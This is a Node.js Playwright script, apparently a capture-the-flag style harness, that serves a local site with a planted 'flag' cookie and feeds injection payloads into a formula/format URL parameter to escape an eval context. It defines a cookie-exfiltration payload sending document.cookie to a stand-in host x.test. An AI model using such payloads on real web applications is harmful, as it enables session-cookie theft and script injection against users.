const http = require("http");
const fs = require("fs");
const path = require("path");
const { chromium } = require("playwright");

const SITE = path.join(__dirname, "site");
const PORT = 8099;
const COOKIE = "FLAGMARK_abc123";

const server = http.createServer((req, res) => {
  let p = decodeURIComponent(req.url.split("?")[0]);
  if (p === "/") p = "/index.html";
  const fp = path.join(SITE, p);
  fs.readFile(fp, (err, data) => {
    if (err) { res.writeHead(200, {"Content-Type":"text/html"}); res.end(fs.readFileSync(path.join(SITE,"index.html"))); return; }
    const ext = path.extname(fp);
    const ct = ext===".js"?"text/javascript":ext===".css"?"text/css":"text/html";
    res.writeHead(200, {"Content-Type":ct});
    res.end(data);
  });
});

function q(o){ return Object.entries(o).map(([k,v])=>k+"="+encodeURIComponent(v)).join("&"); }

(async () => {
  await new Promise(r => server.listen(PORT, r));
  const browser = await chromium.launch();
  const ctx = await browser.newContext();
  await ctx.addCookies([{ name:"flag", value:COOKIE, url:`http://localhost:${PORT}`, httpOnly:false }]);

  async function test(format, formula){
    const page = await ctx.newPage();
    const events = [];
    page.on("dialog", d => { events.push("DIALOG:"+d.type()+":"+d.message().slice(0,60)); d.dismiss().catch(()=>{}); });
    page.on("request", r => {
      const u = r.url();
      if (!u.startsWith(`http://localhost:${PORT}`) || u.includes(COOKIE)) events.push("REQ:"+u.slice(0,120));
    });
    page.on("framenavigated", f => { const u=f.url(); if(!u.startsWith(`http://localhost:${PORT}/?`) && !u.startsWith(`http://localhost:${PORT}/index`)) events.push("NAV:"+u.slice(0,120)); });
    // abort external nav/reqs so they register but don't error out the run
    await page.route("**", route => {
      const u = route.request().url();
      if (u.startsWith(`http://localhost:${PORT}`)) return route.continue();
      events.push("EXT:"+u.slice(0,140));
      return route.abort();
    });
    const url = `http://localhost:${PORT}/?` + q({x:"1", y:"2", formula: formula||"x + y", format: format, autoEval:"1"});
    try { await page.goto(url, { waitUntil:"domcontentloaded", timeout:8000 }); } catch(e){}
    await page.waitForTimeout(1200);
    let answer="";
    try { answer = await page.$eval("#answer", el=>el.textContent); } catch(e){ answer="(no #answer / navigated)"; }
    const cur = page.url();
    await page.close();
    const win = events.some(e => e.includes(COOKIE));
    return { format, answer: (answer||"").slice(0,50), cur: cur.slice(0,60), events, win };
  }

  const EXF_FORMULA = `new Image().src="http://x.test/HIT?c="+document.cookie`;
  const diagnostics = [
    ["standard", null],
    [",alert", null],
    [",[a=1]", null],                                  // strict? (throw) vs non-strict
    [`,[location="http://x.test/NAVHIT"]`, null],      // navigation via array assignment
    [",[b=name]", null],
    ["+eval.call", null],
    [",eval", null],
  ];
  console.log("===== DIAGNOSTICS =====");
  for (const [f, fo] of diagnostics){
    const r = await test(f, fo);
    console.log(JSON.stringify(r));
  }

  await browser.close();
  server.close();
})();
